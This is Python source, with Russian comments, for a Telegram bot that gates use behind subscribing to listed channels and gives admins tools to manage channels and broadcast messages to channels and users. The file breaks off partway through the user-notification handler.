import json
import os  # <-- уже есть
import asyncio
import random
import logging
import time
from datetime import datetime
from typing import Dict, List, Optional, Set
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, ConversationHandler
from telegram.constants import ParseMode
import telegram.ext.filters as filters

# Настройка логов
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Чтение токена из переменной окружения
API_TOKEN = os.environ.get("BOT_TOKEN", "")

# Проверка, что токен установлен
if not API_TOKEN:
    print("❌ ОШИБКА: Переменная окружения BOT_TOKEN не установлена!")
    print("Установите переменную окружения BOT_TOKEN на хостинге")
    exit(1)

ADMIN_IDS = [6997318168 ]
MASTER_ID = 6997318168

CHANNELS_FILE = 'channels.json'
SUBMISSIONS_FILE = 'submissions.json'
BROADCAST_CHANNELS_FILE = 'broadcast_channels.json'
USERS_FILE = 'users.json'

# Остальной код без изменений...

# Состояния ConversationHandler
NAME, LINK = range(2)
BROADCAST_WAITING, BROADCAST_CONFIRM = range(2, 4)
NOTIFY_WAITING, NOTIFY_CONFIRM = range(4, 6)

# ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def is_master(user_id: int) -> bool:
    return user_id == MASTER_ID

# ===== КЭШИРОВАНИЕ =====
class Cache:
    def __init__(self):
        self._users = None
        self._users_time = None
        self._channels = None
        self._channels_time = None
        self._broadcast = None
        self._broadcast_time = None
        self._submissions = None
        self._submissions_time = None
        self.ttl = 60
    
    def _is_valid(self, cache_time):
        if cache_time is None:
            return False
        return (datetime.now() - cache_time).seconds < self.ttl
    
    # Пользователи
    def get_users(self):
        if self._users and self._is_valid(self._users_time):
            return self._users.copy()
        return None
    
    def set_users(self, data):
        self._users = data.copy() if data else {}
        self._users_time = datetime.now()
    
    def invalidate_users(self):
        self._users = None
        self._users_time = None
    
    # Каналы подписки
    def get_channels(self):
        if self._channels and self._is_valid(self._channels_time):
            return self._channels.copy()
        return None
    
    def set_channels(self, data):
        self._channels = data.copy() if data else {}
        self._channels_time = datetime.now()
    
    # Каналы рассылки
    def get_broadcast(self):
        if self._broadcast and self._is_valid(self._broadcast_time):
            return self._broadcast.copy()
        return None
    
    def set_broadcast(self, data):
        self._broadcast = data.copy() if data else {}
        self._broadcast_time = datetime.now()
    
    # Заявки
    def get_submissions(self):
        if self._submissions and self._is_valid(self._submissions_time):
            return self._submissions.copy()
        return None
    
    def set_submissions(self, data):
        self._submissions = data.copy() if data else {}
        self._submissions_time = datetime.now()

cache = Cache()

# ===== ФУНКЦИИ ИЗ ВАШЕГО ФАЙЛА (БЕЗ ИЗМЕНЕНИЙ) =====
def load_users() -> Dict:
    cached = cache.get_users()
    if cached is not None:
        return cached
    
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
        else:
            data = {}
    except Exception as e:
        logger.error(f"Error loading users: {e}")
        data = {}
    
    cache.set_users(data)
    return data.copy()

def save_user(user_id: int, username: str, first_name: str, last_name: str = ""):
    users = load_users()
    user_id_str = str(user_id)
    
    users[user_id_str] = {
        'username': username or "",
        'first_name': first_name or "",
        'last_name': last_name or "",
        'last_seen': datetime.now().isoformat(),
        'joined_date': users.get(user_id_str, {}).get('joined_date', datetime.now().isoformat())
    }
    
    try:
        with open(USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(users, f, ensure_ascii=False, indent=2)
        cache.set_users(users)
    except Exception as e:
        logger.error(f"Error saving user: {e}")
        cache.invalidate_users()

def get_user_count() -> int:
    users = load_users()
    return len(users)

# ===== КАНАЛЫ ДЛЯ ПОДПИСКИ =====
def load_channels() -> Dict:
    cached = cache.get_channels()
    if cached is not None:
        return cached
    
    try:
        if os.path.exists(CHANNELS_FILE):
            with open(CHANNELS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
        else:
            data = {
                "1": {"name": "Канал №1", "link": "https://t.me/+k1eBaFb3N8FkYmM6"},
                "2": {"name": "Канал №2", "link": "https://t.me/+nQNnRAQuXkxmODky"}
            }
    except Exception as e:
        logger.error(f"Error loading channels: {e}")
        data = {}
    
    cache.set_channels(data)
    return data.copy()

def save_channels(channels: Dict):
    try:
        with open(CHANNELS_FILE, 'w', encoding='utf-8') as f:
            json.dump(channels, f, ensure_ascii=False, indent=2)
        cache.set_channels(channels)
    except Exception as e:
        logger.error(f"Error saving channels: {e}")
        cache.set_channels({})

# ===== КАНАЛЫ ДЛЯ РАССЫЛКИ =====
def load_broadcast_channels() -> Dict:
    cached = cache.get_broadcast()
    if cached is not None:
        return cached
    
    try:
        if os.path.exists(BROADCAST_CHANNELS_FILE):
            with open(BROADCAST_CHANNELS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
        else:
            data = {}
    except Exception as e:
        logger.error(f"Error loading broadcast channels: {e}")
        data = {}
    
    cache.set_broadcast(data)
    return data.copy()

def save_broadcast_channel(chat_id: int, chat_title: str) -> bool:
    try:
        channels = load_broadcast_channels()
        chat_id_str = str(chat_id)
        
        if chat_id_str in channels:
            channels[chat_id_str]['title'] = chat_title
            channels[chat_id_str]['last_updated'] = datetime.now().isoformat()
        else:
            channels[chat_id_str] = {
                'title': chat_title,
                'added_date': datetime.now().isoformat(),
                'last_updated': datetime.now().isoformat(),
                'has_access': True
            }
        
        with open(BROADCAST_CHANNELS_FILE, 'w', encoding='utf-8') as f:
            json.dump(channels, f, ensure_ascii=False, indent=2)
        
        cache.set_broadcast(channels)
        return True
    except Exception as e:
        logger.error(f"Error saving broadcast channel: {e}")
        return False

# ===== ЗАЯВКИ =====
def load_submissions() -> Dict:
    cached = cache.get_submissions()
    if cached is not None:
        return cached
    
    try:
        if os.path.exists(SUBMISSIONS_FILE):
            with open(SUBMISSIONS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
        else:
            data = {}
    except Exception as e:
        logger.error(f"Error loading submissions: {e}")
        data = {}
    
    cache.set_submissions(data)
    return data.copy()

def save_submissions(submissions: Dict):
    try:
        with open(SUBMISSIONS_FILE, 'w', encoding='utf-8') as f:
            json.dump(submissions, f, ensure_ascii=False, indent=2)
        cache.set_submissions(submissions)
    except Exception as e:
        logger.error(f"Error saving submissions: {e}")
        cache.set_submissions({})

# ===== ВАЖНЫЕ ФУНКЦИИ ИЗ ВАШЕГО ФАЙЛА =====
async def check_bot_permissions(chat_id: int, context) -> bool:
    """Проверка прав бота в канале (полная версия)"""
    try:
        me = await context.bot.get_me()
        bot_member = await context.bot.get_chat_member(chat_id, me.id)
        return bot_member.status in ['administrator', 'creator']
    except Exception as e:
        logger.error(f"Error checking permissions for chat {chat_id}: {e}")
        return False

async def get_accessible_channels(context) -> Dict:
    """Получение списка доступных каналов (полная версия)"""
    try:
        channels = load_broadcast_channels()
        accessible_channels = {}
        
        for chat_id_str, channel_info in channels.items():
            try:
                chat_id = int(chat_id_str)
                has_access = await check_bot_permissions(chat_id, context)
                
                if has_access:
                    accessible_channels[chat_id_str] = channel_info
                    channels[chat_id_str]['has_access'] = True
                    channels[chat_id_str]['last_checked'] = datetime.now().isoformat()
                else:
                    channels[chat_id_str]['has_access'] = False
                    channels[chat_id_str]['last_checked'] = datetime.now().isoformat()
                    
            except Exception as e:
                logger.error(f"Error checking channel {chat_id_str}: {e}")
                channels[chat_id_str]['has_access'] = False
        
        with open(BROADCAST_CHANNELS_FILE, 'w', encoding='utf-8') as f:
            json.dump(channels, f, ensure_ascii=False, indent=2)
        
        cache.set_broadcast(channels)
        return accessible_channels
        
    except Exception as e:
        logger.error(f"Error in get_accessible_channels: {e}")
        return {}

# ===== START (ПОЛНАЯ ВЕРСИЯ) =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /start"""
    user = update.effective_user
    user_id = user.id
    
    save_user(user_id, user.username or "", user.first_name or "", user.last_name or "")
    
    channels = load_channels()
    
    channel_list = "\n".join([f"- {data['name']}" for data in channels.values()])
    
    text = f"Чтобы пользоваться ботом, подпишитесь на каналы:\n\n{channel_list}"
    
    await update.message.reply_text(text, reply_markup=make_user_keyboard(user_id))

def make_user_keyboard(user_id: int = None) -> InlineKeyboardMarkup:
    """Создание клавиатуры для пользователя"""
    channels = load_channels()
    submissions = load_submissions()
    keyboard = []
    
    user_submissions = submissions.get(str(user_id), {})
    
    for channel_id, channel_data in channels.items():
        is_submitted = user_submissions.get(channel_id, False)
        
        if is_submitted:
            button = InlineKeyboardButton(
                text=f"✅ {channel_data['name']}",
                callback_data=f"submitted_{channel_id}"
            )
        else:
            button = InlineKeyboardButton(
                text=channel_data['name'],
                url=channel_data['link']
            )
        keyboard.append([button])
    
    check_button = InlineKeyboardButton(
        text="✅ Я ПОДАЛ ЗАЯВКУ", 
        callback_data="check_submission"
    )
    keyboard.append([check_button])
    
    return InlineKeyboardMarkup(keyboard)

# ===== ОБРАБОТЧИКИ КНОПОК (ПОЛНЫЕ) =====
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = query.from_user
    
    if query.data == "check_submission":
        submissions = load_submissions()
        user_submissions = submissions.get(str(user.id), {})
        channels = load_channels()
        
        all_submitted = True
        missing_channels = []
        
        for channel_id in channels:
            if not user_submissions.get(channel_id, False):
                all_submitted = False
                missing_channels.append(channels[channel_id]['name'])
        
        if all_submitted:
            user_info = f"@{user.username}" if user.username else f"ID: {user.id}"
            
            admin_text = (
                "🎉 **Пользователь подал все заявки!**\n\n"
                f"👤 Пользователь: {user_info}\n"
                f"📛 Имя: {user.first_name}\n"
                f"🕒 Время: {query.message.date}"
            )
            
            # Отправляем всем админам в фоне
            asyncio.create_task(notify_admins_background(admin_text, context))
            
            success_text = "🎉 **Поздравляем! Вы подали все заявки!**"
            await query.edit_message_text(text=success_text)
        else:
            missing_list = "\n".join([f"- {name}" for name in missing_channels])
            
            error_text = f"❌ ВЫ НЕ ПОДАЛИ ЗАЯВКУ ВО ВСЕ КАНАЛЫ!\n\n{missing_list}"
            
            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text=error_text,
                reply_to_message_id=query.message.message_id
            )
    
    elif query.data.startswith("submitted_"):
        await query.answer("✅ Вы уже подтвердили заявку в этот канал")

async def notify_admins_background(admin_text: str, context):
    """Уведомление админов в фоне"""
    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_message(chat_id=admin_id, text=admin_text)
        except:
            pass

# ===== АДМИН ПАНЕЛЬ (ПОЛНАЯ) =====
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Нет прав доступа.")
        return
    
    text = "⚙️ **Панель администратора**"
    
    keyboard = [
        [InlineKeyboardButton("➕ Добавить канал", callback_data="admin_add")],
        [InlineKeyboardButton("📋 Список каналов", callback_data="admin_list")],
        [InlineKeyboardButton("🗑 Удалить канал", callback_data="admin_delete")],
        [InlineKeyboardButton("👥 Сбросить заявки", callback_data="admin_reset")],
        [InlineKeyboardButton("📢 Управление рассылкой", callback_data="broadcast_panel_callback")],
        [InlineKeyboardButton("👥 Оповещать пользователей", callback_data="notify_panel")]
    ]
    
    if update.message:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        query = update.callback_query
        await query.answer()
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def admin_button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if not is_admin(query.from_user.id):
        return
    
    if query.data == "admin_add":
        await query.message.reply_text("📝 Введите название канала:")
        return NAME
    
    elif query.data == "admin_list":
        channels = load_channels()
        
        if not channels:
            await query.message.reply_text("❌ Нет каналов.")
            return
        
        channel_list = "\n".join([f"{i}. {data['name']}\n   🔗 {data['link']}" 
                                for i, data in channels.items()])
        
        await query.message.reply_text(f"📋 Каналы:\n\n{channel_list}")
    
    elif query.data == "admin_delete":
        channels = load_channels()
        
        if not channels:
            await query.message.reply_text("❌ Нет каналов для удаления.")
            return
        
        keyboard = []
        for channel_id, channel_data in channels.items():
            button = InlineKeyboardButton(
                f"🗑 {channel_data['name']}",
                callback_data=f"delete_{channel_id}"
            )
            keyboard.append([button])
        
        await query.message.reply_text(
            "🗑 Выберите канал для удаления:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "admin_reset":
        save_submissions({})
        await query.message.reply_text("✅ Все заявки сброшены!")
    
    elif query.data == "broadcast_panel_callback":
        await broadcast_panel_callback(update, context)
    
    elif query.data == "notify_panel":
        await query.message.edit_text("🔄 Загружаем панель рассылки...")
        await notify_users_command_from_callback(query)

async def delete_channel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data.startswith('delete_'):
        channel_id = query.data.split('_')[1]
        channels = load_channels()
        
        if channel_id in channels:
            channel_name = channels[channel_id]['name']
            del channels[channel_id]
            save_channels(channels)
            await query.message.reply_text(f"✅ Канал «{channel_name}» удален!")
        else:
            await query.message.reply_text("❌ Канал не найден!")

async def get_channel_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['channel_name'] = update.message.text
    await update.message.reply_text("🔗 Отправьте ссылку:")
    return LINK

async def get_channel_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    channel_name = context.user_data['channel_name']
    channel_link = update.message.text
    
    channels = load_channels()
    new_id = str(len(channels) + 1)
    
    channels[new_id] = {
        'name': channel_name,
        'link': channel_link
    }
    
    save_channels(channels)
    
    await update.message.reply_text(f"✅ Канал «{channel_name}» добавлен!")
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Отменено.")
    return ConversationHandler.END

async def confirm_submission(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = query.from_user
    
    if query.data.startswith("confirm_"):
        channel_id = query.data.split("_")[1]
        
        submissions = load_submissions()
        user_id_str = str(user.id)
        
        if user_id_str not in submissions:
            submissions[user_id_str] = {}
        
        submissions[user_id_str][channel_id] = True
        save_submissions(submissions)
        
        await query.answer("✅ Заявка подтверждена!")
        await query.edit_message_reply_markup(reply_markup=make_user_keyboard(user.id))

# ===== РАССЫЛКА ПО КАНАЛАМ (ПОЛНАЯ ВЕРСИЯ) =====
async def broadcast_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Панель управления рассылкой (полная версия)"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Нет прав доступа.")
        return
    
    accessible_channels = await get_accessible_channels(context)
    channels_count = len(accessible_channels)
    
    text = f"📢 **Панель управления рассылкой**\n\n"
    text += f"✅ Доступных каналов: {channels_count}\n\n"
    
    if channels_count > 0:
        text += "Доступные каналы:\n"
        for i, (chat_id, info) in enumerate(accessible_channels.items(), 1):
            text += f"{i}. {info['title']}\n"
    
    keyboard = [
        [InlineKeyboardButton("📤 Начать рассылку", callback_data="broadcast_start")],
        [InlineKeyboardButton("🔄 Проверить доступ", callback_data="broadcast_check")],
        [InlineKeyboardButton("📋 Список каналов", callback_data="broadcast_list")],
        [InlineKeyboardButton("❌ Очистить неактивные", callback_data="broadcast_clean")]
    ]
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def broadcast_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик кнопки Управление рассылкой (полная)"""
    query = update.callback_query
    await query.answer()
    
    if not is_admin(query.from_user.id):
        return
    
    accessible_channels = await get_accessible_channels(context)
    channels_count = len(accessible_channels)
    
    text = f"📢 **Панель управления рассылкой**\n\n"
    text += f"✅ Доступных каналов: {channels_count}\n\n"
    
    if channels_count > 0:
        text += "Доступные каналы:\n"
        for i, (chat_id, info) in enumerate(accessible_channels.items(), 1):
            text += f"{i}. {info['title']}\n"
    
    keyboard = [
        [InlineKeyboardButton("📤 Начать рассылку", callback_data="broadcast_start")],
        [InlineKeyboardButton("🔄 Проверить доступ", callback_data="broadcast_check")],
        [InlineKeyboardButton("📋 Список каналов", callback_data="broadcast_list")],
        [InlineKeyboardButton("❌ Очистить неактивные", callback_data="broadcast_clean")]
    ]
    
    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def broadcast_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Начало процесса рассылки"""
    query = update.callback_query
    await query.answer()
    
    if not is_admin(query.from_user.id):
        return
    
    accessible_channels = await get_accessible_channels(context)
    
    if not accessible_channels:
        await query.message.edit_text("❌ Нет доступных каналов для рассылки!")
        return
    
    context.user_data['broadcast_channels'] = accessible_channels
    
    await query.message.edit_text(
        "📝 **Начинаем рассылку!**\n\n"
        "Отправьте сообщение для рассылки (текст, фото, видео или документ).\n"
        "Поддерживаются все типы сообщений.\n\n"
        "Используйте /cancel для отмены."
    )
    
    return BROADCAST_WAITING

async def handle_broadcast_content(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка контента для рассылки (полная с entities)"""
    if not is_admin(update.effective_user.id):
        return
    
    context.user_data['broadcast_message'] = {
        'message_id': update.message.message_id,
        'chat_id': update.effective_chat.id
    }
    
    if update.message.text:
        context.user_data['broadcast_message']['type'] = 'text'
        context.user_data['broadcast_message']['content'] = update.message.text
        context.user_data['broadcast_message']['entities'] = update.message.entities
    
    elif update.message.photo:
        context.user_data['broadcast_message']['type'] = 'photo'
        context.user_data['broadcast_message']['photo'] = update.message.photo[-1].file_id
        context.user_data['broadcast_message']['caption'] = update.message.caption
        context.user_data['broadcast_message']['caption_entities'] = update.message.caption_entities
    
    elif update.message.video:
        context.user_data['broadcast_message']['type'] = 'video'
        context.user_data['broadcast_message']['video'] = update.message.video.file_id
        context.user_data['broadcast_message']['caption'] = update.message.caption
        context.user_data['broadcast_message']['caption_entities'] = update.message.caption_entities
    
    elif update.message.document:
        context.user_data['broadcast_message']['type'] = 'document'
        context.user_data['broadcast_message']['document'] = update.message.document.file_id
        context.user_data['broadcast_message']['caption'] = update.message.caption
        context.user_data['broadcast_message']['caption_entities'] = update.message.caption_entities
    
    else:
        await update.message.reply_text("❌ Неподдерживаемый тип сообщения!")
        return ConversationHandler.END
    
    channels = context.user_data.get('broadcast_channels', {})
    channels_count = len(channels)
    
    keyboard = [
        [InlineKeyboardButton("✅ Начать рассылку", callback_data="broadcast_confirm")],
        [InlineKeyboardButton("❌ Отменить", callback_data="broadcast_cancel")]
    ]
    
    await update.message.reply_text(
        f"📋 **Подтверждение рассылки**\n\n"
        f"📤 Будет отправлено в: {channels_count} каналов\n"
        f"📝 Тип сообщения: {context.user_data['broadcast_message']['type']}\n\n"
        f"Нажмите 'Начать рассылку' для подтверждения.",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    
    return BROADCAST_CONFIRM

async def execute_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Выполнение рассылки (оптимизированная)"""
    query = update.callback_query
    await query.answer()
    
    if not is_admin(query.from_user.id):
        return ConversationHandler.END
    
    if query.data == "broadcast_cancel":
        await query.message.edit_text("❌ Рассылка отменена.")
        return ConversationHandler.END
    
    if query.data != "broadcast_confirm":
        return ConversationHandler.END
    
    broadcast_message = context.user_data.get('broadcast_message')
    channels = context.user_data.get('broadcast_channels', {})
    
    if not broadcast_message or not channels:
        await query.message.edit_text("❌ Ошибка: данные рассылки не найдены!")
        return ConversationHandler.END
    
    total_channels = len(channels)
    progress_msg = await query.message.edit_text(f"🔄 Начинаем рассылку...\n\n0/{total_channels}")
    
    # Запускаем рассылку в фоне
    asyncio.create_task(
        execute_broadcast_background(
            context, channels, broadcast_message, progress_msg, query.message
        )
    )
    
    await query.message.reply_text(
        f"✅ **Рассылка запущена в фоне!**\n\n"
        f"📤 Каналов: {total_channels}\n"
        f"📝 Тип: {broadcast_message['type']}\n\n"
        f"Прогресс обновляется выше. Бот работает!"
    )
    
    if 'broadcast_message' in context.user_data:
        del context.user_data['broadcast_message']
    if 'broadcast_channels' in context.user_data:
        del context.user_data['broadcast_channels']
    
    return ConversationHandler.END

async def execute_broadcast_background(context, channels: Dict, broadcast_message: Dict, 
                                     progress_msg, query_message):
    """Фоновая задача рассылки"""
    successful = 0
    failed = 0
    failed_channels = []
    total = len(channels)
    
    for i, (chat_id_str, channel_info) in enumerate(channels.items(), 1):
        try:
            chat_id = int(chat_id_str)
            
            if broadcast_message['type'] == 'text':
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=broadcast_message['content'],
                    entities=broadcast_message.get('entities')
                )
            elif broadcast_message['type'] == 'photo':
                await context.bot.send_photo(
                    chat_id=chat_id,
                    photo=broadcast_message['photo'],
                    caption=broadcast_message.get('caption'),
                    caption_entities=broadcast_message.get('caption_entities')
                )
            elif broadcast_message['type'] == 'video':
                await context.bot.send_video(
                    chat_id=chat_id,
                    video=broadcast_message['video'],
                    caption=broadcast_message.get('caption'),
                    caption_entities=broadcast_message.get('caption_entities')
                )
            elif broadcast_message['type'] == 'document':
                await context.bot.send_document(
                    chat_id=chat_id,
                    document=broadcast_message['document'],
                    caption=broadcast_message.get('caption'),
                    caption_entities=broadcast_message.get('caption_entities')
                )
            
            successful += 1
            
        except Exception as e:
            failed += 1
            failed_channels.append(f"{channel_info['title']} ({str(e)[:50]})")
            logger.error(f"Error sending to {chat_id_str}: {e}")
        
        # Обновляем прогресс
        if i % 5 == 0 or i == total:
            try:
                await progress_msg.edit_text(
                    f"🔄 Рассылка...\n\n"
                    f"✅ Успешно: {successful}\n"
                    f"❌ Ошибок: {failed}\n"
                    f"📊 Прогресс: {i}/{total}"
                )
            except:
                pass
        
        await asyncio.sleep(0.5)
    
    report = f"📊 **Рассылка завершена!**\n\n"
    report += f"✅ Успешно отправлено: {successful}\n"
    report += f"❌ Не отправлено: {failed}\n"
    
    if total > 0:
        report += f"📈 Эффективность: {(successful/total*100):.1f}%\n"
    
    if failed_channels:
        report += f"\n❌ Проблемные каналы:\n"
        for failed_channel in failed_channels[:10]:
            report += f"• {failed_channel}\n"
        if len(failed_channels) > 10:
            report += f"и еще {len(failed_channels) - 10}...\n"
    
    try:
        await progress_msg.edit_text(report)
    except:
        pass

async def broadcast_list_channels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Показать список каналов для рассылки (полная)"""
    query = update.callback_query
    await query.answer()
    
    if not is_admin(query.from_user.id):
        return
    
    accessible_channels = await get_accessible_channels(context)
    all_channels = load_broadcast_channels()
    
    text = "📋 **Список каналов для рассылки**\n\n"
    
    if accessible_channels:
        text += "✅ **ДОСТУПНЫЕ:**\n"
        for i, (chat_id, info) in enumerate(accessible_channels.items(), 1):
            text += f"{i}. {info['title']} (ID: {chat_id})\n"
    
    inactive_channels = {k: v for k, v in all_channels.items() if k not in accessible_channels}
    if inactive_channels:
        text += f"\n❌ **НЕАКТИВНЫЕ ({len(inactive_channels)}):**\n"
        for i, (chat_id, info) in enumerate(inactive_channels.items(), 1):
            text += f"{i}. {info['title']} (ID: {chat_id})\n"
    
    if not all_channels:
        text = "❌ Нет сохраненных каналов для рассылки.\n\n" \
               "**Чтобы добавить каналы:**\n" \
               "1. Дайте боту админку в канале\n" \
               "2. Напишите в канале команду **/savechannel**\n" \
               "3. Или используйте **/saveid ID_КАНАЛА**\n\n" \
               "Пример: /saveid -1001234567890"
    
    await query.message.edit_text(text)

async def broadcast_check_access(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Проверить доступ к каналам"""
    query = update.callback_query
    await query.answer()
    
    if not is_admin(query.from_user.id):
        return
    
    progress_msg = await query.message.edit_text("🔄 Проверяем доступ к каналам...")
    
    accessible_channels = await get_accessible_channels(context)
    all_channels = load_broadcast_channels()
    
    await progress_msg.edit_text(
        f"🔍 **Проверка доступа завершена**\n\n"
        f"📊 Всего каналов в базе: {len(all_channels)}\n"
        f"✅ Доступных каналов: {len(accessible_channels)}\n"
        f"❌ Недоступных: {len(all_channels) - len(accessible_channels)}\n\n"
        f"Для рассылки доступно {len(accessible_channels)} каналов."
    )

async def broadcast_clean_inactive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Очистить неактивные каналы"""
    query = update.callback_query
    await query.answer()
    
    if not is_admin(query.from_user.id):
        return
    
    accessible_channels = await get_accessible_channels(context)
    
    with open(BROADCAST_CHANNELS_FILE, 'w', encoding='utf-8') as f:
        json.dump(accessible_channels, f, ensure_ascii=False, indent=2)
    
    cache.set_broadcast(accessible_channels)
    
    all_channels = load_broadcast_channels()
    removed_count = len(all_channels) - len(accessible_channels)
    
    await query.message.edit_text(
        f"🧹 **Очистка завершена**\n\n"
        f"✅ Активных сохранено: {len(accessible_channels)}\n"
        f"🗑 Удалено неактивных: {removed_count}"
    )

async def broadcast_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Отмена рассылки"""
    if not is_admin(update.effective_user.id):
        return
    
    if 'broadcast_message' in context.user_data:
        del context.user_data['broadcast_message']
    if 'broadcast_channels' in context.user_data:
        del context.user_data['broadcast_channels']
    
    await update.message.reply_text("❌ Рассылка отменена.")
    return ConversationHandler.END

# ===== РАССЫЛКА ПОЛЬЗОВАТЕЛЯМ (ПОЛНАЯ) =====
async def notify_users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда для рассылки пользователям"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Нет прав доступа.")
        return
    
    user_count = get_user_count()
    
    text = f"👥 **Рассылка пользователям**\n\n"
    text += f"📊 Всего пользователей: {user_count}\n\n"
    text += "Выберите действие:\n"
    
    keyboard = [
        [InlineKeyboardButton("📤 Начать рассылку", callback_data="notify_users_start")],
        [InlineKeyboardButton("📊 Статистика", callback_data="notify_stats")],
        [InlineKeyboardButton("🔙 Назад", callback_data="back_to_admin")]
    ]
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def notify_users_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик кнопок рассылки пользователям"""
    query = update.callback_query
    await query.answer()
    
    if not is_admin(query.from_user.id):
        return
    
    if query.data == "notify_users_start":
        user_count = get_user_count()
        
        if user_count == 0:
            await query.message.edit_text("❌ Нет пользователей для рассылки!")
            return
        
        await query.message.edit_text(
            f"📝 **Начинаем рассылку пользователям!**\n\n"
            f"👥 Получателей: {user_count} пользователей\n\n"
            f"Отправьте сообщение для рассылки (текст, фото, видео или документ).\n"
            f"Поддерживаются все типы сообщений.\n\n"
            f"Используйте /cancel для отмены."
        )
        
        context.user_data['notify_mode'] = True
        return NOTIFY_WAITING
    
    elif query.data == "notify_stats":
        users = load_users()
        total_users = len(users)
        
        active_last_week = 0
        active_last_month = 0
        
        for user_data in users.values():
            last_seen_str = user_data.get('last_seen')
            if last_seen_str:
                try:
                    last_seen = datetime.fromisoformat(last_seen_str)
                    days_ago = (datetime.now() - last_seen).days
                    
                    if days_ago <= 7:
                        active_last_week += 1
                    if days_ago <= 30:
                        active_last_month += 1
                except:
                    pass
        
        text = f"📊 **Статистика пользователей**\n\n"
        text += f"👥 Всего пользователей: {total_users}\n"
        text += f"📈 Активных за неделю: {active_last_week}\n"
        text += f"📈 Активных за месяц: {active_last_month}\n"
        text += f"📉 Неактивных: {total_users - active_last_month}\n\n"
        
        if total_users > 0:
            text += "🆕 Последние пользователи:\n"
            
            sorted_users = sorted(
                users.items(),
                key=lambda x: x[1].get('joined_date', ''),
                reverse=True
            )[:5]
            
            for user_id_str, user_data in sorted_users:
                username = user_data.get('username', 'нет юзернейма')
                first_name = user_data.get('first_name', '')
                text += f"• @{username} ({first_name})\n"
        else:
            text += "📭 Пользователей еще нет"
        
        keyboard = [
            [InlineKeyboardButton("📤 Начать рассылку", callback_data="notify_users_start")],
            [InlineKeyboardButton("🔙 Назад", callback_data="notify_back")]
        ]
        
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif query.data == "notify_back":
        await notify_users_command_from_callback(query)
    
    elif query.data == "notify_panel":
        await query.message.edit_text("🔄 Загружаем панель рассылки...")
        await notify_users_command_from_callback(query)

async def notify_users_command_from_callback(query):
    """Вспомогательная функция для вызова из callback"""
    user_count = get_user_count()
    
    text = f"👥 **Рассылка пользователям**\n\n"
    text += f"📊 Всего пользователей: {user_count}\n\n"
    text += "Выберите действие:\n"
    
    keyboard = [
        [InlineKeyboardButton("📤 Начать рассылку", callback_data="notify_users_start")],
        [InlineKeyboardButton("📊 Статистика", callback_data="notify_stats")],
        [InlineKeyboardButton("🔙 Назад", callback_data="back_to_admin")]
    ]
    
    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def handle_notify_content(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка контента для рассылки пользователям (полная)"""
    if not is_admin(update.effective_user.id):
        return
    
    if not context.user_data.get('notify_mode'):
        return
    
    context.user_data['notify_message'] = {
        'message_id': update.message.message_id,
        'chat_id': update.effective_chat.id
    }
    
    if update.message.text:
        context.user_data['notify_message']['type'] = 'text'
        context.user_data['notify_message']['content'] = update.message.text
        context.user_data['notify_message']['entities'] = update.message.entities
    
    elif update.message.photo:
        context.user_data['notify_message']['type'] = 'photo'
        context.user_data['notify_message']['photo'] = update.message.photo[-1].file_id
        context.user_data['notify_message']['caption'] = update.message.caption
        context.user_data['notify_message']['caption_entities'] = update.message.caption_entities
    
    elif update.message.video:
        context.user_data['notify_message']['type'] = 'video'
        context.user_data['notify_message']['video'] = update.message.video.file_id
        context.user_data['notify_message']['caption'] = update.message.caption
